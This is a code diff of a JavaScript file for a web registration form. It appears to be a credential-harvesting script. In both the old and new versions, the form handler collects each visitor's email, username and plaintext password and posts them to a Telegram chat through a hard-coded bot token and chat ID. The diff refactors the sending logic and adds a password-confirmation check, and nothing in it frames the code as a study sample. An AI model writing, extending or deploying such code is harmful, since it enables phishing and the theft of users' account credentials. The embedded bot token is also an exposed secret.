@@ -1,48 +1,51 @@
-const { jsx } = require("react/jsx-runtime");
-
 const BOT_TOKEN = "8326445763:AAEhryKL60bbSe0Y-YDYs2SPEM6XDW26cDw";
 const CHAT_ID = "7176789176";
 const URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-document.getElementById("Register").addEventListener("submit", (e) => {
+document.getElementById("Register").addEventListener("submit", async (e) => {
   e.preventDefault();
 
   const email = document.getElementById("email").value.trim();
   const username = document.getElementById("text").value.trim();
   const password = document.getElementById("password").value.trim();
+  const confirm = document.querySelector('input[name="confirm"]').value.trim();
 
-  if (!email || !username || !password) {
-    alert("Please fill in the information completely!");
+  
+  if (!email || !username || !password || !confirm) {
+    alert("Please fill in all fields!");
     return;
   }
 
-  const message = `<b>User Account</b>\nEmail: ${email}\nUsername: ${username}\nPassword: ${password}`;
+  if (password !== confirm) {
+    alert("Passwords do not match!");
+    return;
+  }
 
-  fetch(URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: "HTML",
-    }),
-  })
-    .then((res) => res.json())
-    .then((message) => {
-      if (message.ok) {
-        document.getElementById("Register").reset();
-        document.getElementById("sendBtn").addEventListener("click", function() {
-          alert("Register successfully!!");
-          setTimeout(function() {
-            window.location.href="index4.html";
-          }, 1000);
-        })
-      } else {
-        alert("Register failed!");
-      }
-    })
-    .catch((err) => {
-      alert("There was a problem while sending data!");
-      console.error(err);
+  const msgText = `<b> User Register</b>\n Email: ${email}\n Username: ${username}\n Password: ${password}`;
+
+  try {
+    const response = await fetch(URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: msgText,
+        parse_mode: "HTML",
+      }),
     });
+
+    const data = await response.json();
+
+    if (data.ok) {
+      alert("Register successfully!");
+      document.getElementById("Register").reset();
+      alert("Welcome to menu!");
+      window.location.href="index4.html";
+    } else {
+      alert("Failed to send data!");
+    }
+  } catch (error) {
+    console.error("Error:", error);
+    alert("There was a problem while sending data!");
+  }
 });
